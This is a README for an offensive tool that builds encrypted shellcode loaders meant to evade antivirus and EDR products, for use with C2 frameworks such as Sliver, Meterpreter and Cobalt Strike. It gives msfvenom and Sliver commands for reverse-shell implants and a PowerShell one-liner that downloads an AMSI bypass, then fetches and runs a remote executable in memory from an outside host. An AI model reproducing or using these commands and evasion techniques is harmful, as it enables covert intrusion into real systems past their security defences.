# sn0wldr

## This is used to generate a AV bypassed sc loader.

up to test day, most common AVs can be bypassed: Windows defender, ATP, CS Falcon, Carbon Black, Red Canary, Cylance and McAfee.

### Install MONO when using Linux
```
sudo apt install apt-transport-https dirmngr gnupg ca-certificates
sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
echo "deb https://download.mono-project.com/repo/debian stable-buster main" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update
sudo apt-get install mono-complete
```

### Currently supporting the following C2 plateform (It is now should be able to support any C2 if shellcode is provided):

* Meterpreter
* Covenent
* Sliver
* Cobalt Strike


### Feature

* Process Hollowing
* Behaviour detection bypass
* Random AES encryption
* Rewrite to use D/Invoke direct syscalls
* Add a new haloloader_template to use [SharpHalos](https://github.com/GetRektBoy724/SharpHalos), HaloGates direct syscalls methods to load shellcode

### Guide

1. Generate shellcode for supported C2 implant in raw format:
For Sliver:
```
### To Generate a Sliver implant shellcode without obfuscation:
# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/sn0wldr/input/
# [*] Generating new windows/amd64 implant binary
# [!] Symbol obfuscation is disabled
# [*] Build completed in 00:01:25
# [*] Implant saved to /root/Codes/sn0wldr/input/sliver.bin
#
### Move the sliver.bin to folder input if required, then run the autogen script.
```

For Meterpreter:
```
### To Generate a Meterpreter implant shellcode without obfuscation:
# for x64
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/meterpreter.bin
# for x86
# msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.0.145 LPORT=8443 -f raw -o input/meterpreter.bin
### Move the meterpreter.bin to folder input if required, then run the autogen script.
```

For CobaltStrike:
```
### To Generate a CS implant shellcode without obfuscation:
# Attacks -> Packages -> Payload Generator
# Choose Raw in Output area.
### Move the cobaltstrike.bin to folder input and rename to cobaltstrike.bin, then run the autogen script.
```

2. Move the generated shellcode bin file to `input` folder

3. Modify the autogen script
For halogates loader, fill in the below three parameters in the universal autogen bash script file `autogen_halo.sh`:
```
...truncated...
arch="x64"
c2type="sliver"
rawscfilename='sliver.bin'
...truncated...
```

4. Run the autogen script, wait for couple of minutes and check the generated encrypted EXE in the output folder.

5. Since the gneerated EXE are Sharp Assembly, so it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
```
IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
```

### To Do

* Add bananameowloader for even better AV bypass
* Add InlineExecute-Assembly BoF support for Sliver

